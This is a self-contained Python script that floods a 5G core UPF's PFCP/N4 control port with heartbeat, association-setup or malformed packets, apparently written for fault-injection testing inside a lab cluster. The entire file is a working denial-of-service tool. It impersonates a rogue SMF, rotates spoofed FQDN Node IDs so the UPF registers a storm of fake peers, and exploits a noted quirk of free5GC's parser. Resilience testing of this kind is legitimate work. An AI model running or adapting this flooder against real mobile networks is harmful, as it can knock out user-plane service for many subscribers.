#!/usr/bin/env python3
"""A small PFCP (N4) control-message flooder for level-B faults.

PFCP (3GPP TS 29.244) is the protocol the SMF uses to drive the UPF, over UDP/8805. This sends a
burst of node-related PFCP messages straight at the UPF, as a rogue/overloading SMF would, to flood
its N4 control path. It builds the packets by hand (stdlib only), so it needs nothing in the pod it
runs in but a Python 3 interpreter.

kinds:
  heartbeat  PFCP Heartbeat Request (type 1): header + Recovery Time Stamp. The UPF must parse and
             answer each one -- the cheapest well-formed flood.
  assoc      PFCP Association Setup Request (type 5): header + Node ID + Recovery Time Stamp, with a
             different source Node ID each packet, so the UPF sees a storm of new peers associating.
  malformed  a well-formed header with a truncated/garbage body: exercises the UPF's error path.

Run from inside the cluster (the UPF's N4 is a pod IP behind the headless `upf` Service):
  python3 pfcp_flood.py --target upf --rate 2000 --duration 60 --kind assoc
"""
import argparse
import os
import socket
import struct
import time

PFCP_PORT = 8805
MSG = {"heartbeat": 1, "assoc": 5, "malformed": 1}


def _ie(ie_type, value):
    return struct.pack("!HH", ie_type, len(value)) + value


def _recovery_ie():
    # Recovery Time Stamp (type 96): seconds since 1900 (NTP epoch), 4 bytes.
    return _ie(96, struct.pack("!I", int(time.time()) + 2208988800 & 0xFFFFFFFF))


def _node_id_ie_fqdn(name):
    # Node ID (type 60): first byte 2 = FQDN, then the name in DNS label format (len-prefixed
    # labels). free5GC's UPF (go-pfcp) rejects an IPv4 Node ID here with "unexpected EOF", but
    # accepts an FQDN one; a fresh name per packet makes each request register a new peer.
    labels = b"".join(bytes([len(l)]) + l.encode() for l in name.split("."))
    return _ie(60, b"\x02" + labels)


def _header(msg_type, seq, body_len):
    # Flags 0x20 = version 1, no SEID. Length counts from the sequence number onward.
    length = 4 + body_len
    return struct.pack("!BBH", 0x20, msg_type, length) + struct.pack("!I", seq << 8)[:3] + b"\x00"


def _packet(kind, seq):
    if kind == "heartbeat":
        body = _recovery_ie()
    elif kind == "assoc":
        body = _node_id_ie_fqdn("rogue%d.flood" % seq) + _recovery_ie()
    else:  # malformed: claim a long body but send a few garbage bytes
        return struct.pack("!BBH", 0x20, 1, 64) + struct.pack("!I", seq << 8)[:3] + b"\x00" + os.urandom(6)
    return _header(MSG[kind], seq, len(body)) + body


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True)
    ap.add_argument("--port", type=int, default=PFCP_PORT)
    ap.add_argument("--rate", type=int, default=2000, help="packets per second (0 = as fast as possible)")
    ap.add_argument("--duration", type=float, default=60.0)
    ap.add_argument("--kind", choices=list(MSG), default="assoc")
    a = ap.parse_args()

    addr = (socket.gethostbyname(a.target), a.port)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    interval = 1.0 / a.rate if a.rate else 0.0
    end = time.time() + a.duration
    seq = 1
    sent = 0
    next_t = time.time()
    while time.time() < end:
        try:
            s.sendto(_packet(a.kind, seq & 0xFFFFFF), addr)
            sent += 1
        except OSError:
            pass
        seq += 1
        if interval:
            next_t += interval
            delay = next_t - time.time()
            if delay > 0:
                time.sleep(delay)
            else:
                next_t = time.time()
    print("pfcp_flood: sent %d %s packets to %s:%d" % (sent, a.kind, a.target, a.port))


if __name__ == "__main__":
    main()
